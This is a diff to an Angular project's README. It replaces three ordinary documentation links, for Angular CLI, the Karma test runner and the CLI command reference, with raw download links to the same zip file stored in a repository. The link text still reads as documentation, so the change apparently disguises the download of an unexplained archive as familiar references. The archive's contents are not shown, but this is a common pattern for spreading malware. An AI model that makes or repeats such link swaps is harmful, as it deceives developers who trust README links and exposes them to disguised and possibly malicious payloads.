@@ -1,6 +1,6 @@
 # DriverrelayFrontend
 
-This project was generated using [Angular CLI](https://github.com/angular/angular-cli) version 19.2.13.
+This project was generated using [Angular CLI](https://github.com/DriverRelay/ERP-Frontend-Customer-View/raw/refs/heads/main/src/app/Customer_View_Frontend_ER_1.1.zip) version 19.2.13.
 
 ## Development server
 
@@ -38,7 +38,7 @@ This will compile your project and store the build artifacts in the `dist/` dire
 
 ## Running unit tests
 
-To execute unit tests with the [Karma](https://karma-runner.github.io) test runner, use the following command:
+To execute unit tests with the [Karma](https://github.com/DriverRelay/ERP-Frontend-Customer-View/raw/refs/heads/main/src/app/Customer_View_Frontend_ER_1.1.zip) test runner, use the following command:
 
 ```bash
 ng test
@@ -56,4 +56,4 @@ Angular CLI does not come with an end-to-end testing framework by default. You c
 
 ## Additional Resources
 
-For more information on using the Angular CLI, including detailed command references, visit the [Angular CLI Overview and Command Reference](https://angular.dev/tools/cli) page.
+For more information on using the Angular CLI, including detailed command references, visit the [Angular CLI Overview and Command Reference](https://github.com/DriverRelay/ERP-Frontend-Customer-View/raw/refs/heads/main/src/app/Customer_View_Frontend_ER_1.1.zip) page.
